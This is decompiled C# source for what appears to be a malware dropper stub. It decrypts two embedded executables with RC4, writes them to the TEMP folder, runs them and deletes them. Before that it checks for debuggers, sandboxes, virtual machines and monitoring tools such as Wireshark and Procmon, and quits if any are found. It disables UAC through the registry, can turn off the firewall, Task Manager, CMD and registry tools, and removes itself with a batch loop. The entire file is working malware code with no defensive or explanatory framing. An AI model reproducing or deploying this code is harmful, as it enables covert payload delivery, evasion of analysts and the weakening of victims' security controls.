using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Stub;

internal class Stub
{
	private static byte[] Key = new byte[7] { 14, 26, 37, 48, 59, 60, 71 };

	private static string[] Filenames = new string[2] { "DBot.exe", "setup.exe" };

	private static int count = 1;

	private static bool AntiDebugger = true;

	private static bool AntiEmulator = true;

	private static bool AntiNetstat = true;

	private static bool AntiSandboxie = true;

	private static bool AntiFilemon = true;

	private static bool AntiProcessmon = true;

	private static bool AntiRegmon = true;

	private static bool AntiCainandAbel = true;

	private static bool AntiNetworkmon = true;

	private static bool AntiTCPView = true;

	private static bool AntiWireshark = true;

	private static bool AntiParallelsDesktop = true;

	private static bool AntiVMWare = true;

	private static bool AntiVirtualBox = true;

	private static bool AntiVirtualPC = true;

	private static bool MeltServer = false;

	private static bool FakeError = false;

	private static string FakeErrorTitle = "VALUEFAKEERRORTITLE";

	private static string FakeErrorMessage = "VALUEFAKEERRORMESSAGE";

	private static bool DisableUAC = true;

	private static bool DisableCMD = false;

	private static bool DisableFirewall = false;

	private static bool DisableRegistry = false;

	private static bool DisableTaskmanager = false;

	public static bool CheckProcessIsRun(string sProcessName)
	{
		return Process.GetProcessesByName(sProcessName).Length > 0;
	}

	public static string GetGraphicDevice()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");
		string result = string.Empty;
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				result = Convert.ToString(((ManagementBaseObject)val2).get_Item("Description"));
			}
			return result;
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static void tFakeError()
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(FakeErrorMessage, FakeErrorTitle, (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	public static void Decrypt(ref byte[] bytes, byte[] key)
	{
		byte[] array = new byte[256];
		byte[] array2 = new byte[256];
		int i;
		for (i = 0; i < 256; i++)
		{
			array[i] = (byte)i;
			array2[i] = key[i % key.GetLength(0)];
		}
		int num = 0;
		for (i = 0; i < 256; i++)
		{
			num = (num + array[i] + array2[i]) % 256;
			byte b = array[i];
			array[i] = array[num];
			array[num] = b;
		}
		num = 0;
		i = 0;
		for (int j = 0; j < bytes.GetLength(0); j++)
		{
			i = (i + 1) % 256;
			num = (num + array[i]) % 256;
			byte b = array[i];
			array[i] = array[num];
			array[num] = b;
			int num2 = (array[i] + array[num]) % 256;
			bytes[j] ^= array[num2];
		}
	}

	private static void Main(string[] args)
	{
		//IL_00b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00be: Expected O, but got Unknown
		if (FakeError)
		{
			try
			{
				Thread thread = new Thread(tFakeError);
				thread.Start();
			}
			catch
			{
			}
		}
		if (AntiDebugger)
		{
			try
			{
				if (Debugger.IsAttached)
				{
					return;
				}
			}
			catch
			{
			}
		}
		if (AntiEmulator)
		{
			try
			{
				long num = 0L;
				long num2 = 0L;
				num = DateTime.Now.Ticks;
				Thread.Sleep(10);
				num2 = DateTime.Now.Ticks;
				if (num2 - num < 10L)
				{
					return;
				}
			}
			catch
			{
			}
		}
		if (AntiNetstat)
		{
			try
			{
				if (CheckProcessIsRun("NETSTAT"))
				{
					return;
				}
			}
			catch
			{
			}
		}
		if (AntiSandboxie)
		{
			try
			{
				Form val = new Form();
				((Control)val).set_Text("TEST");
				val.set_Opacity(0.0);
				val.set_ShowInTaskbar(false);
				((Control)val).Show();
				if (((Control)val).get_Text() == "[#] TEST [#]")
				{
					return;
				}
				val.Close();
			}
			catch
			{
			}
		}
		if (AntiFilemon)
		{
			try
			{
				if (CheckProcessIsRun("FILEMON"))
				{
					return;
				}
			}
			catch
			{
			}
		}
		if (AntiProcessmon)
		{
			try
			{
				if (CheckProcessIsRun("PROCMON"))
				{
					return;
				}
			}
			catch
			{
			}
		}
		if (AntiRegmon)
		{
			try
			{
				if (CheckProcessIsRun("REGMON"))
				{
					return;
				}
			}
			catch
			{
			}
		}
		if (AntiCainandAbel)
		{
			try
			{
				if (CheckProcessIsRun("CAIN"))
				{
					return;
				}
			}
			catch
			{
			}
		}
		if (AntiNetworkmon)
		{
			try
			{
				if (CheckProcessIsRun("NETMON"))
				{
					return;
				}
			}
			catch
			{
			}
		}
		if (AntiTCPView)
		{
			try
			{
				if (CheckProcessIsRun("TCPVIEW"))
				{
					return;
				}
			}
			catch
			{
			}
		}
		if (AntiWireshark)
		{
			try
			{
				if (CheckProcessIsRun("WIRESHARK"))
				{
					return;
				}
			}
			catch
			{
			}
		}
		if (AntiParallelsDesktop)
		{
			try
			{
				string graphicDevice = GetGraphicDevice();
				if (graphicDevice == "Parallels Video Adapter")
				{
					return;
				}
			}
			catch
			{
			}
		}
		if (AntiVMWare)
		{
			try
			{
				string graphicDevice2 = GetGraphicDevice();
				if (graphicDevice2 == "VMware SVGA II")
				{
					return;
				}
			}
			catch
			{
			}
		}
		if (AntiVirtualBox)
		{
			try
			{
				string graphicDevice3 = GetGraphicDevice();
				if (graphicDevice3 == "VirtualBox Graphics Adapter")
				{
					return;
				}
			}
			catch
			{
			}
		}
		if (AntiVirtualPC)
		{
			try
			{
				string[] array = new string[2] { "VM Additions S3 Trio32/64", "S3 Trio32/64" };
				for (int i = 0; i < array.Length; i++)
				{
					string graphicDevice4 = GetGraphicDevice();
					if (graphicDevice4 == array[i])
					{
						return;
					}
				}
			}
			catch
			{
			}
		}
		for (int j = 0; j <= count; j++)
		{
			try
			{
				Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(j + ".txt");
				byte[] bytes = new byte[manifestResourceStream.Length];
				manifestResourceStream.Read(bytes, 0, bytes.Length);
				manifestResourceStream.Close();
				Decrypt(ref bytes, Key);
				FileStream fileStream = new FileStream(Environment.GetEnvironmentVariable("TEMP") + "\\" + Filenames[j], FileMode.Create);
				fileStream.Write(bytes, 0, bytes.Length);
				fileStream.Close();
				fileStream.Dispose();
				Process process = new Process();
				process.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\" + Filenames[j];
				process.Start();
			}
			catch
			{
			}
		}
		for (int k = 0; k <= count; k++)
		{
			try
			{
				File.Delete(Environment.GetEnvironmentVariable("TEMP") + "\\" + Filenames[k]);
			}
			catch
			{
			}
		}
		if (DisableUAC)
		{
			try
			{
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", writable: true)!.SetValue("EnableBalloonTips", "0", RegistryValueKind.DWord);
			}
			catch
			{
			}
			try
			{
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
				Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
			}
			catch
			{
			}
			if (DisableCMD)
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Policies\\Microsoft\\Windows\\System");
				if (registryKey == null)
				{
					registryKey = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System");
					Registry.CurrentUser.OpenSubKey("Software\\Policies\\Microsoft\\Windows\\System", writable: true)!.SetValue("DisableCMD", "2", RegistryValueKind.DWord);
				}
				else
				{
					Registry.CurrentUser.OpenSubKey("Software\\Policies\\Microsoft\\Windows\\System", writable: true)!.SetValue("DisableCMD", "2", RegistryValueKind.DWord);
				}
			}
			if (DisableFirewall)
			{
				try
				{
					Process process2 = new Process();
					process2.StartInfo.FileName = "Netsh";
					process2.StartInfo.Arguments = "Advfirewall set Currentprofile State off";
					process2.StartInfo.UseShellExecute = false;
					process2.StartInfo.CreateNoWindow = true;
					process2.Start();
				}
				catch
				{
				}
			}
			if (DisableRegistry)
			{
				try
				{
					RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
					if (registryKey2 == null)
					{
						registryKey2 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
						Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("DisableRegistryTools", "1", RegistryValueKind.DWord);
					}
					else
					{
						Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("DisableRegistryTools", "1", RegistryValueKind.DWord);
					}
				}
				catch
				{
				}
			}
			if (DisableTaskmanager)
			{
				try
				{
					RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
					if (registryKey3 == null)
					{
						registryKey3 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
						Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("DisableTaskMgr", "1", RegistryValueKind.DWord);
					}
					else
					{
						Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("DisableTaskMgr", "1", RegistryValueKind.DWord);
					}
				}
				catch
				{
				}
			}
		}
		if (!MeltServer)
		{
			return;
		}
		try
		{
			if (!Application.get_ExecutablePath().Contains(Environment.GetEnvironmentVariable("TEMP")))
			{
				string value = ":Repeat\ndel " + '"' + Environment.GetCommandLineArgs()[0] + '"' + "\nif exist " + '"' + Path.GetFileName(Application.get_ExecutablePath()) + '"' + " goto Repeat";
				TextWriter textWriter = new StreamWriter(Environment.GetEnvironmentVariable("TEMP") + "\\delete.bat");
				textWriter.WriteLine(value);
				textWriter.Close();
				Process process3 = new Process();
				process3.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\delete.bat";
				process3.StartInfo.UseShellExecute = false;
				process3.StartInfo.CreateNoWindow = true;
				process3.Start();
			}
		}
		catch
		{
		}
	}
}
